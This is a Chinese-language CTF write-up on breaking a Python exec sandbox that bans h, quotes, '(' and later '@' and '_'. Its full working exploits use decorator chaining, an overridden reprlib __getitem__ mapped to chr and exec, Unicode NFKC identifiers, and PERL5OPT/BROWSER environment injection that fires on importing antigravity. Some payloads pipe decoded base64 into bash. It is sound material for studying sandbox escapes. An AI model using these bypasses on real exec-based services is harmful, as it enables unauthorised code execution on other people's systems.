# python受限的任意代码执行与黑魔法
## 起因
在NCTF/NJUPTCTF 2021中有一道misc题: 
```python
我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~
但是为了防止有些居心叵测的人，我们专门把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~

Ubuntu Python3.6.9

快去找Hex酱(QQ:2821876761)私聊吧
附件：

https://nctf.slight-wind.com/misc/hex/runner.py
https://attachment.h4ck.fun:9000/misc/hex/runner.py
```

其中附件内容如下:
```python
import sys
from base64 import b64decode

code = sys.argv[1]

try:
    data = b64decode(code.encode()).decode()
except:
    exit(0)

for c in 'h"\'(':
    if c in data: exit(0)

exec(data)
```

这其实就是一个受限制的python代码执行，不能使用h，单引号，双引号，左括号字符。我们知道在SSTI中我们如果禁用了小括号的话是没办法任意命令执行的，但是在任意python代码执行的情况下还有转机吗？

## 正解: 装饰器
正解不是本篇文章主要讨论的内容，这里也介绍一下，其实就是python装饰器的技巧，一个简单的python装饰器如下:
```python
def log(func):
    def wrapper(*args, **kw):
        print("here is a log")
        func()
    return wrapper


@log
def func():
    print("hello world")


func()
```
这里的`@log`实际上是一个语法糖，他等价于`func=log(func)`，也就是说这里隐式包含了函数调用，同时**装饰器是可以嵌套的**，并且能够用于**装饰类**。

但是这里我们依然用到了小括号，我们怎样才能避免这个情况呢？实际上是用到了python的(残废)匿名函数，一个简单的python匿名函数如下:

```python
func = lambda _: "system" # 意思是无论传入什么参数最终都会返回system这个字符串
print(func("anything")) # system
```

所以我们可以使用嵌套的装饰器去调用`os.system()`, 例如:
```python
from os import system
c = lambda _: "whoami"

@system
@c
class x:pass
```
实际上调用的是`system(c(x))`，而c函数不管传入什么都会返回"whoami"这个字符串，最终实现命令执行

这里还有最后一个问题是如何构造字符串，因为我们是没办法使用单引号或者双引号的，所以我们需要利用一些python原生的字符串，比如某些类的`__doc__`,比如字典(dict)的doc如下:
```text
dict() -> new empty dictionary
dict(mapping) -> new dictionary initialized from a mapping object's
    (key, value) pairs
dict(iterable) -> new dictionary initialized as if via:
    d = {}
    for k, v in iterable:
        d[k] = v
dict(**kwargs) -> new dictionary initialized with the name=value pairs
    in the keyword argument list.  For example:  dict(one=1, two=2)
```
这里面基本上存在我们需要的英文字符，可以使用`{}.__doc__[index]`的形式获取字符串，所以最终的exp可以是:
```python
from os import system
n = {}.__doc__
f = lambda _: n[2]+n[80]+n[55]+n[6]+n[75]+n[69]+n[80]+n[88]  # cat flag
@system
@f
class x:pass
```

## 寻找非预期
如果我们不使用装饰器的方法，这道题目还有做法吗？换句话说假如我们不允许代码中存在@这个字符，这道题还能够解吗？答案是肯定的。

所以我们的题目变成:
```python
import sys
from base64 import b64decode

code = sys.argv[1]

try:
    data = b64decode(code.encode()).decode()
except:
    exit(0)

for c in 'h@"\'(':
    if c in data: exit(0)

exec(data)
```

这里我们重新思考一下，我们在没有小括号使用的情况下，还有什么能够使用呢？答案是中括号，我们知道，如果我们尝试使用中括号根据索引去获取对象时，实际上是调用了类中的`__getitem__`方法，一个简单的示例如下:
```python
class C:
    def __getitem__(self, key):
        return str(key) + "111"

c = C()
print(c["qwe"])  # qwe111
```
可以看到这里的`__getitem__`魔术方法是一个特殊的方法，当我们调用`c["anything"]`的是时候实际上调用了`c.__getitem__("qwe")`，这样我们即使没有小括号也能够进行函数调用。如果我们可以覆盖某些类的`__getitem__`方法为一些自带方法的话，我们就可以实现命令执行了。

### 失败的尝试: 覆盖自带类的__getitem__
我的第一个想法是覆盖python自带类的`__getitem__`方法，例如list或者dict，但是经过测试之后发现这是行不通的:
![](https://gitee.com/guuest/images/raw/master/img/20220104104649.png)

所以我们的目的就是要找到一个类能够覆盖其`__getitem__`并且能获取到这个**类的实例**，这里的重点是获取到类的实例，因为我们就算可以定义一个自定义的类，也无法获取这个类的实例，因为**获取类的实例也需要小括号**

### 成功的尝试: python标准库里的魔术
我们尝试从python标准库中找到一个符合我们标准的库，python的标准库参考[这里](https://docs.python.org/zh-cn/3/library/index.html)

在一番寻找后，我们将目光投向`reprlib`这个库，它完美符合了我们的要求!
![](https://gitee.com/guuest/images/raw/master/img/20220104110102.png)
一个简单的示例如下:
```python
import reprlib
reprlib.Repr.__getitem__=exec
a=reprlib.aRepr
a["print('whoami')"]
```

所以我们最终的exp构造大致如下:
1. 从标准库中引入reprlib这个库
2. 覆盖`reprlib.Repr`的`__getitem__`方法为chr方法
3. 通过`reprlib.aRepr`中括号调用构造任意字符串
4. 再次覆盖为`exec`方法
5. 真正意义上的python代码执行

这里需要注意的是由于h也被禁用了，所以我们没有办法直接`reprlib.Repr.__getitem__=chr`，需要走一下弯路，利用builtins库的`__dict__`再利用字典的`__doc__`，我们最终得到一个非常酷的exp如下:
```python
data = """
import reprlib
import builtins
__=reprlib.aRepr
reprlib.Repr.__getitem__ = builtins.__dict__[{}.__doc__[2]+{}.__doc__[280]+{}.__doc__[28]]  # chr
exp=__[95]+__[95]+__[105]+__[109]+__[112]+__[111]+__[114]+__[116]+__[95]+__[95]+__[40]+__[39]+__[111]+__[115]+__[39]+__[41]+__[46]+__[115]+__[121]+__[115]+__[116]+__[101]+__[109]+__[40]+__[39]+__[119]+__[104]+__[111]+__[97]+__[109]+__[105]+__[39]+__[41] // __import__('os').system('whoami')
reprlib.Repr.__getitem__ = exec
reprlib.aRepr[exp]
"""

for c in 'h@"\'(':
    if c in data:
        print(c)
        exit(0)

exec(data)
```

### 更进一步
实际上python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: https://peps.python.org/pep-3131/ ，这里需要注意的是这一点:
> The following changes will need to be made to the parser:
> 1.  If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character)
> 2.  The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other_ID_{Start|Continue} property.
> 3.  If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in `__dict__` slots as keys.

稍微翻译一下也就是说如果我们使用了UTF-8中的非ASCII码作为标识符，那么其会被函数转换为NFKC标准格式，也就是说我们可以使用例如`ʰ`来代替`h`，从而绕过限制。

但是假如我们的题目会将用户输入先转换为NFKC标准格式再进行判断，并且将`_`这个字符也过滤，，我们还有办法实现任意代码执行吗？

```python
from unicodedata import normalize
data  = input()
data = normalize("NFKC", data)

for c in 'h@"\'(_':
    if c in data:
        print(c)
        exit(0)

exec(data)
```

很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考[HACKING WITH ENVIRONMENT VARIABLES](https://www.elttam.com/blog/env/)

我们这里先贴出最终的exp，然后再分析其原理:
```python
from string import printable
from base64 import b64decode
from unicodedata import normalize

def translate(s):
    r = ""
    for c in s:
        r += f"x[{printable.find(c)}]+"

    return r.rstrip("+")


code = f"""
from os import environ
from string import printable as x
environ[{translate("PERL5OPT")}] = {translate("-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;")}
environ[{translate("BROWSER")}] = {translate("perlthanks")}
import antigravity
""" # exp

code = normalize("NFKC", code)

for c in 'h"\'(@_':
    if c in code:
        print("no!!!!")
        exit(0)

exec(code)
```

这个exp实际上利用到了perl的环境变量注入，这里不对perl做过多的深入研究，大概原理是在perl运行时会使用到`PERL5OPT`这个环境变量，这个环境变量可以指定`-M`选项导入模块，同时在这之后可以注入一段perl代码，利用这个最终实现任意代码执行。

我们重点关注BROWSER环境变量和`antigravity`这个模块。`antigravity`这个模块实际上是在python添加的一个圣诞节彩蛋，我们可以在[这里](https://hg.python.org/cpython/file/tip/Lib/antigravity.py)看到它的源码:
![](https://gitee.com/guuest/images/raw/master/img/20220321172430.png)

这里唯一值得注意的是其在被导入时会调用`webbrowser.open()`方法打开一个网站，我们在cpython中看看其[代码](https://github.com/python/cpython/blob/main/Lib/webbrowser.py)的实现，重点关注以下几个函数:

open函数会在没有browser时先注册，然后调用`browser.open()`去打开对应的网址:
```python
def open(url, new=0, autoraise=True):
    """Display url using the default browser.
    If possible, open url in a location determined by new.
    - 0: the same browser window (the default).
    - 1: a new browser window.
    - 2: a new browser page ("tab").
    If possible, autoraise raises the window (the default) or not.
    """
    if _tryorder is None:
        with _lock:
            if _tryorder is None:
                register_standard_browsers()
    for name in _tryorder:
        browser = get(name)
        if browser.open(url, new, autoraise):
            return True
    return False
```

register_standard_browsers函数会调用register函数注册浏览器，实际上就是将浏览器名字与对应的类绑定在了一起，我们注意到这里使用到了一个环境变量`BROWSER`，可以允许使用者覆盖自己的浏览器，如果设置了这个环境变量，其最终会注册一个GenericBrowser类:
```python
def register_standard_browsers():
    global _tryorder
    _tryorder = []

    if sys.platform == 'darwin':
        register("MacOSX", None, MacOSXOSAScript('default'))
        register("chrome", None, MacOSXOSAScript('chrome'))
        register("firefox", None, MacOSXOSAScript('firefox'))
        register("safari", None, MacOSXOSAScript('safari'))
        # OS X can use below Unix support (but we prefer using the OS X
        # specific stuff)

    if sys.platform == "serenityos":
        # SerenityOS webbrowser, simply called "Browser".
        register("Browser", None, BackgroundBrowser("Browser"))

    if sys.platform[:3] == "win":
        # First try to use the default Windows browser
        register("windows-default", WindowsDefault)

        # Detect some common Windows browsers, fallback to IE
        iexplore = os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"),
                                "Internet Explorer\\IEXPLORE.EXE")
        for browser in ("firefox", "firebird", "seamonkey", "mozilla",
                        "netscape", "opera", iexplore):
            if shutil.which(browser):
                register(browser, None, BackgroundBrowser(browser))
    else:
        # Prefer X browsers if present
        if os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"):
            try:
                cmd = "xdg-settings get default-web-browser".split()
                raw_result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
                result = raw_result.decode().strip()
            except (FileNotFoundError, subprocess.CalledProcessError, PermissionError, NotADirectoryError) :
                pass
            else:
                global _os_preferred_browser
                _os_preferred_browser = result

            register_X_browsers()

        # Also try console browsers
        if os.environ.get("TERM"):
            if shutil.which("www-browser"):
                register("www-browser", None, GenericBrowser("www-browser"))
            # The Links/elinks browsers <http://artax.karlin.mff.cuni.cz/~mikulas/links/>
            if shutil.which("links"):
                register("links", None, GenericBrowser("links"))
            if shutil.which("elinks"):
                register("elinks", None, Elinks("elinks"))
            # The Lynx browser <http://lynx.isc.org/>, <http://lynx.browser.org/>
            if shutil.which("lynx"):
                register("lynx", None, GenericBrowser("lynx"))
            # The w3m browser <http://w3m.sourceforge.net/>
            if shutil.which("w3m"):
                register("w3m", None, GenericBrowser("w3m"))

    # OK, now that we know what the default preference orders for each
    # platform are, allow user to override them with the BROWSER variable.
    if "BROWSER" in os.environ:
        userchoices = os.environ["BROWSER"].split(os.pathsep)
        userchoices.reverse()

        # Treat choices in same way as if passed into get() but do register
        # and prepend to _tryorder
        for cmdline in userchoices:
            if cmdline != '':
                cmd = _synthesize(cmdline, preferred=True)
                if cmd[1] is None:
                    register(cmdline, None, GenericBrowser(cmdline), preferred=True)
```

`GenericBrowser.open()`函数是我们最终的目的，其调用了`subprocess.open()`函数:
```python
class GenericBrowser(BaseBrowser):
    """Class for all browsers started with a command
       and without remote functionality."""

    def __init__(self, name):
        if isinstance(name, str):
            self.name = name
            self.args = ["%s"]
        else:
            # name should be a list with arguments
            self.name = name[0]
            self.args = name[1:]
        self.basename = os.path.basename(self.name)

    def open(self, url, new=0, autoraise=True):
        sys.audit("webbrowser.open", url)
        cmdline = [self.name] + [arg.replace("%s", url)
                                 for arg in self.args]
        try:
            if sys.platform[:3] == 'win':
                p = subprocess.Popen(cmdline)
            else:
                p = subprocess.Popen(cmdline, close_fds=True)
            return not p.wait()
        except OSError:
            return False
```

综上所述，如果我们控制了`BROWSER`这个环境变量，就可以控制命令执行调用的命令，最终执行类似于`BROWSER https://xkcd.com/353/`这样的命令，我们是没办法控制命令的参数的。这里就需要利用到其他命令的环境变量注入了。

在一般的linux发行版中，一般自带了perl这个编程语言以及默认的perl脚本，例如perldoc和perlthanks，这里exp最终使用的是perlthanks/perldoc而非使用perl的原因是如果执行`perl https://xkcd.com/353/`，那么perl会报错返回，不会处理`PERL5OPT`这个环境变量，而`perldoc`与`perlthanks`这2个脚本则再处理了`PERL5OPT`之后返回，这给了我们最终exp的机会。

最终我们来回顾一下exp，除了上面提到的点之外，我们还使用了`string.printable`这串字符串来构造任意字符，其包含了所有可见的ascii字符。
```python
from string import printable
from base64 import b64decode
from unicodedata import normalize

def translate(s):
    r = ""
    for c in s:
        r += f"x[{printable.find(c)}]+"

    return r.rstrip("+")


code = f"""
from os import environ
from string import printable as x
environ[{translate("PERL5OPT")}] = {translate("-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;")}
environ[{translate("BROWSER")}] = {translate("perlthanks")}
import antigravity
""" # exp

code = normalize("NFKC", code)

for c in 'h"\'(@_':
    if c in code:
        print("no!!!!")
        exit(0)

exec(code)
```